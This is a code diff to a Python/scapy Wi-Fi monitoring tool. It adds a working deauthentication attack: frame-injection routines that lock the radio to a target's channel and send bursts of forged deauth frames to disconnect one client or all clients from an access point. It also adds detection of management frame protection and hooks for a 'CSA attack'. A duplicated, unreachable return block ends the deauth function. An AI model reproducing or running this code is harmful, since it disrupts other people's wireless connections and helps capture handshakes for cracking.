@@ -7,7 +7,7 @@ import threading
 import time
 from functools import partial
 
-from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, RadioTap, NoPayload, wrpcap
+from scapy.all import sniff, sendp, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, NoPayload, wrpcap
 from scapy.layers.eap import EAPOL, EAPOL_KEY
 from scapy.config import conf
 
@@ -26,6 +26,9 @@ CHANNELS = CHANNELS_24 + CHANNELS_5
 DWELL = 0.6
 STALE_AGE = 60.0
 HANDSHAKE_HOLD = 3.0
+DEAUTH_COUNT = 64
+DEAUTH_INTERVAL = 0.005
+DEAUTH_RATE = 2
 
 _lock = threading.Lock()
 _mode_lock = threading.RLock()
@@ -198,6 +201,31 @@ def _signal(pkt):
         return None
 
 
+def _rsn_caps(pkt):
+    """Return (mfpc, mfpr) from the RSN IE capabilities, or (False, False).
+
+    MFPC (bit 7) = Management Frame Protection capable.
+    MFPR (bit 6) = Management Frame Protection required (deauth is protected)."""
+    cur = pkt
+    while cur is not None and not isinstance(cur, NoPayload):
+        if isinstance(cur, Dot11Elt) and cur.ID == 48:
+            info = cur.info
+            if isinstance(info, bytes) and len(info) >= 8:
+                try:
+                    pc = int.from_bytes(info[6:8], "little")
+                    akm_off = 8 + 4 * pc
+                    ac = int.from_bytes(info[akm_off:akm_off + 2], "little")
+                    caps_off = akm_off + 2 + 4 * ac
+                    if len(info) >= caps_off + 2:
+                        caps = int.from_bytes(info[caps_off:caps_off + 2], "little")
+                        return bool(caps & 0x80), bool(caps & 0x40)
+                except Exception:
+                    pass
+            return False, False
+        cur = cur.payload
+    return False, False
+
+
 def _security(pkt):
     privacy = False
     try:
@@ -291,6 +319,8 @@ def _process(pkt, device=None):
             return
         _known_bssids.add(bssid)
         dbm = _signal(pkt)
+        mfpc, mfpr = _rsn_caps(pkt)
+        pmf = "required" if mfpr else ("capable" if mfpc else "no")
         with _lock:
             n = _networks.get(bssid)
             if n is None:
@@ -300,6 +330,7 @@ def _process(pkt, device=None):
                     "signal": dbm_to_pct(dbm),
                     "signal_dbm": dbm,
                     "security": _security(pkt),
+                    "pmf": pmf,
                     "chan": _channel(pkt),
                     "freq": channel_to_freq(_channel(pkt)),
                     "devices": set(),
@@ -309,6 +340,7 @@ def _process(pkt, device=None):
                 n["signal"] = dbm_to_pct(dbm)
                 n["signal_dbm"] = dbm
                 n["security"] = _security(pkt)
+                n["pmf"] = pmf
                 n["chan"] = _channel(pkt)
                 n["freq"] = channel_to_freq(_channel(pkt))
             if device:
@@ -639,7 +671,8 @@ def get_networks(iface=None):
             d["device"] = ", ".join(devices)
             d["stale"] = (now - n.get("last_seen", now)) > STALE_AGE
             result.append(d)
-    result.sort(key=lambda x: -x["signal"])
+    # Keep a stable, discovery order (dict insertion order). Sorting by a
+    # fluctuating signal made rows jump around; new networks appear last.
     return result
 
 
@@ -715,7 +748,6 @@ def probes_for(ssid=None, bssid=None):
                 continue
             if bssid and bssid.upper() in e["bssids"]:
                 result.append(_probe_dict(mac, e, now))
-    result.sort(key=lambda x: x["last_seen"], reverse=True)
     return result
 
 
@@ -845,12 +877,131 @@ def _set_channel(iface, channel):
         _run(["iw", "dev", iface, "set", "channel", str(channel)])
 
 
+def _current_channel(iface):
+    if _IS_MACOS:
+        return 0
+    ok, out, _ = _run(["iw", "dev", iface, "info"])
+    if not ok:
+        return 0
+    for line in out.splitlines():
+        m = re.match(r"\s*channel\s+(\d+)", line)
+        if m:
+            return int(m.group(1))
+    return 0
+
+
+def monitor_ifaces():
+    svc = _scanner
+    return list(svc.ifaces) if svc else []
+
+
+def reserve_iface(iface):
+    """Reserve one monitor interface for external use (CSA attack)."""
+    get_service().reserve(iface)
+
+
+def release_iface(iface):
+    """Release an interface reserved with reserve_iface()."""
+    get_service().release(iface)
+
+
+def wait_iface_released(iface, timeout=6.0):
+    """Block until the monitor worker has put iface back to managed mode."""
+    end = time.time() + timeout
+    while time.time() < end:
+        if _iface_type(iface) != "monitor":
+            return True
+        time.sleep(0.1)
+    return _iface_type(iface) != "monitor"
+
+
+def _send_deauth(iface, addr1, addr2, addr3, count, reason):
+    # aircrack-ng style: prepend a 12-byte radiotap with RATE + TXFLAGS
+    # (NOACK|NOSEQ). An empty radiotap is rejected on some drivers.
+    frame = (
+        RadioTap(present="Rate+TXFlags", Rate=DEAUTH_RATE, TXFlags=0x0018)
+        / Dot11(type=0, subtype=12, addr1=addr1, addr2=addr2, addr3=addr3)
+        / Dot11Deauth(reason=reason)
+    )
+    sendp(frame, iface=iface, count=count, inter=DEAUTH_INTERVAL, verbose=0)
+    return count
+
+
+def deauth(bssid, client=None, iface=None, count=DEAUTH_COUNT, reason=7):
+    """Send a burst of deauthentication frames from an AP to a client.
+
+    Returns (ok, message). Linux only, requires the monitor to be running."""
+    if not monitor_supported():
+        return False, "Deauth is not supported on this platform (scan-only)."
+    if not is_running():
+        return False, "WiFi monitor is off. Start the monitor before deauthing."
+    bssid = _mac(bssid)
+    if not bssid:
+        return False, "No target network selected."
+    with _lock:
+        net = _networks.get(bssid)
+        chan = (net or {}).get("chan") or 0
+    if not net:
+        return False, f"Network {bssid} is no longer in the scan list."
+    if not chan:
+        return False, f"Unknown channel for {bssid}; cannot deauth."
+
+    ifaces = monitor_ifaces()
+    if not ifaces:
+        return False, "No WiFi interface is in monitor mode."
+    if iface not in ifaces:
+        iface = ifaces[0]
+    itype = _iface_type(iface)
+    if itype and itype != "monitor":
+        return False, (f"Interface {iface} is not in monitor mode "
+                       f"(type={itype}); cannot inject frames.")
+
+    locked = _locked_channel
+    released = False
+    if locked is not None:
+        if locked != chan:
+            return False, (f"Channel {locked} is locked but {bssid} is on "
+                           f"channel {chan}. Unlock that channel first.")
+    else:
+        lock_channel(chan)
+        released = True
+
+    dst = _mac(client) if client else _BROADCAST
+    if dst in ("", _BROADCAST):
+        dst = _BROADCAST
+    sent = 0
+    try:
+        # Let the monitor worker finish its current dwell so the channel lock
+        # takes effect and the radio is really parked on the target channel.
+        time.sleep(0.7)
+        _set_channel(iface, chan)
+        time.sleep(0.1)
+        sent += _send_deauth(iface, dst, bssid, bssid, count, reason)
+        if dst != _BROADCAST:
+            sent += _send_deauth(iface, bssid, dst, bssid, count, reason)
+    except Exception as e:
+        return False, f"Deauth failed: {e}"
+    finally:
+        if released:
+            unlock_channel()
+
+    target = "all clients (broadcast)" if dst == _BROADCAST else dst
+    return True, (f"Sent {sent} deauth frames to {target} [{bssid}] "
+                  f"channel {chan} (radio on {_current_channel(iface)}) "
+                  f"on {iface}.")
+
+    target = "all clients (broadcast)" if dst == _BROADCAST else dst
+    return True, (f"Sent {count} deauth frames to {target} [{bssid}] "
+                  f"channel {chan} on {iface}.")
+
+
 class WifiMonitorService:
     def __init__(self):
         self._thread = None
         self._running = False
         self._ifaces = []
         self._workers = {}
+        self._excluded = set()
         self._lock = threading.Lock()
 
     def start(self, iface=None):
@@ -876,9 +1027,26 @@ class WifiMonitorService:
     def ifaces(self):
         return list(self._ifaces)
 
+    def reserve(self, iface):
+        """Stop monitoring on a single interface and keep it free for
+        external use (e.g. the CSA pulse attack). Other interfaces keep
+        working untouched."""
+        with self._lock:
+            self._excluded.add(iface)
+            w = self._workers.pop(iface, None)
+            self._ifaces = sorted(self._workers)
+        if w:
+            w["stop"].set()
+
+    def release(self, iface):
+        """Undo reserve(): allow the monitor to use the interface again."""
+        with self._lock:
+            self._excluded.discard(iface)
+
     def _manager(self):
         while self._running:
-            free = [n for n, s in wifi_interfaces_state() if s != "connected"]
+            free = [n for n, s in wifi_interfaces_state()
+                    if s != "connected" and n not in self._excluded]
             with self._lock:
                 for iface in list(self._workers):
                     if iface not in free:
@@ -921,6 +1089,8 @@ class WifiMonitorService:
                 locked_set = None
                 for ch in CHANNELS:
                     if stop_event.is_set() or not self._running:
+                        break
+                    if _locked_channel is not None:
                         break
                     _set_channel(iface, ch)
                     last_err = self._sniff_dwell(iface, process, last_err)
